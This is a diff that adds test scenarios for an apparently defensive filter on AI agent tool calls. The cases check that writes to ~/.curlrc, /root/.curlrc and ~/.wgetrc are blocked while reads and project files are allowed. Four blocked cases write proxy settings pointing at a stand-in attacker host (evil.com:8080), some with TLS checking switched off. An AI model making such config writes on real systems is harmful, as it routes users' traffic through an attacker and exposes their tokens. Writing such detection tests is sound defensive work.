@@ -2648,4 +2648,63 @@ var TrueNegativeScenarios = []Scenario{
 		Category:         "mcp-persistence-shell-profile",
 		Description:      "read_file of ~/.bash_aliases — reading is allowed (only writes are blocked), persistence rule must not fire",
 	},
+
+	// ---------------------------------------------------------------------------
+	// TP/TN: curlrc/wgetrc write blocks (issue #641)
+	// mcp-sec-block-curlrc-write and mcp-sec-block-wgetrc-write
+	// ---------------------------------------------------------------------------
+	{
+		ID:               "MCP-TP-215",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.curlrc", "content": "proxy=http://evil.com:8080\ninsecure"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-network-config-tampering",
+		Description:      "write_file to ~/.curlrc with proxy directive — routes all future curl traffic through attacker proxy, intercepting auth tokens (T1557, mcp-sec-block-curlrc-write)",
+	},
+	{
+		ID:               "MCP-TP-216",
+		ToolName:         "edit_file",
+		Arguments:        map[string]interface{}{"path": "/root/.curlrc", "content": "proxy=http://evil.com:8080"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-network-config-tampering",
+		Description:      "edit_file to /root/.curlrc — MITM proxy injection targeting root user curl traffic (T1557, mcp-sec-block-curlrc-write)",
+	},
+	{
+		ID:               "MCP-TP-217",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.wgetrc", "content": "http_proxy=http://evil.com:8080\ncheck_certificate=off"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-network-config-tampering",
+		Description:      "write_file to ~/.wgetrc with proxy directive — routes all future wget traffic through attacker proxy with TLS disabled (T1557, mcp-sec-block-wgetrc-write)",
+	},
+	{
+		ID:               "MCP-TP-218",
+		ToolName:         "append_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.wgetrc", "content": "https_proxy=http://evil.com:8080"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "mcp-network-config-tampering",
+		Description:      "append_file to ~/.wgetrc — appending HTTPS proxy to intercept encrypted wget traffic (T1557, mcp-sec-block-wgetrc-write)",
+	},
+	{
+		ID:               "MCP-TN-116",
+		ToolName:         "read_file",
+		Arguments:        map[string]interface{}{"path": "/home/user/.curlrc"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "mcp-network-config-tampering",
+		Description:      "read_file of ~/.curlrc — reading curl config is allowed (only writes blocked); mcp-sec-block-curlrc-write must not fire",
+	},
+	{
+		ID:               "MCP-TN-117",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/project/scripts/curlrc-example"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "mcp-network-config-tampering",
+		Description:      "write_file to project curlrc example script — not a home directory dotfile, no rule fires",
+	},
 }
